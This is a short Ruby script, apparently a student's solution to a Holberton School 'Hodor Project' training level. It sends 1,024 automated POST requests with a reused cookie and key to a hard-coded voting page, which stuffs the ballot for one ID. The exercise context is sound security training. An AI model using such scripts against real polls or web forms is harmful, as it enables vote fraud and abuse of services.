#!/usr/bin/env ruby

require 'uri'
require 'net/http'

=begin <= Ruby multiline comment
===---Description---------------------------------------------------------------===
# Solution for the Hodor Project, Level 1 by Julien Barbier.
# Using Ruby Language.
# by Alexandro de Oliveira, for Holberton School
===-----------------------------------------------------------------------------===
=end

# Parsing the URL:
uri = URI.parse("http://173.246.108.142/level1.php")
# Setting the cookie:
cookie = "6b695713db9b371a855adf1e229264c681f2e48"
# Setting the http request:
http = Net::HTTP.new(uri.host, uri.port)
# Setting the http request headers:
headers = {
    'User-Agent' => 'havk64 - Ruby Requests',
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Cookie' => 'HoldTheDoor=' << cookie
}
# Setting POST request parameters:
params = URI.encode_www_form({
    'id' => "23",
    'holdthedoor' => "submit",
    'key' => cookie
})
# Processing the POST requests:
votes = 0 # A vote counter
(1 << 10).times {  # The result of this bitwise operatation(1 << 10) is "1024"
    resp, data = http.post(uri.path, params, headers)
    unless resp.message != 'OK'
        puts "Vote number: #{votes += 1}"
        # Optionally printing the response object hash:
        #puts "Headers: #{resp.to_hash.inspect}"
    else
        puts "Connection error, vote not computed..."
    end
}
